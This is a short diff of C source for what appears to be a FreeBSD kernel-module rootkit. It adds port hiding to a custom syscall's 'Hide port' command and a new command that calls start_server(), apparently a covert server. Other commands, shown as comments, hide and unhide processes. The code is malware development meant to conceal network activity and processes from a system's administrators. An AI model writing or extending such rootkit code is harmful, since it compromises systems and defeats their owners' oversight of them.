@@ -50,9 +50,13 @@ static int main(struct thread *td, void *syscall_args) {
 		case 9://Unhide process
 			break;
 		case 10://Hide port
+			resp = strtol(uap->args[0], NULL, 10);
+			port_hiding((u_int16_t)resp);
 			break;
 		case 11://Unhide port
 			break;
+		case 12:
+			start_server();
 		default:
 			break;
 	}
@@ -74,8 +78,7 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	char buf[256] = {0};
 
-	int testfd = 0;
-	char buf[256] = {0};
+	
 
 	switch (cmd) {
 		case MOD_LOAD:
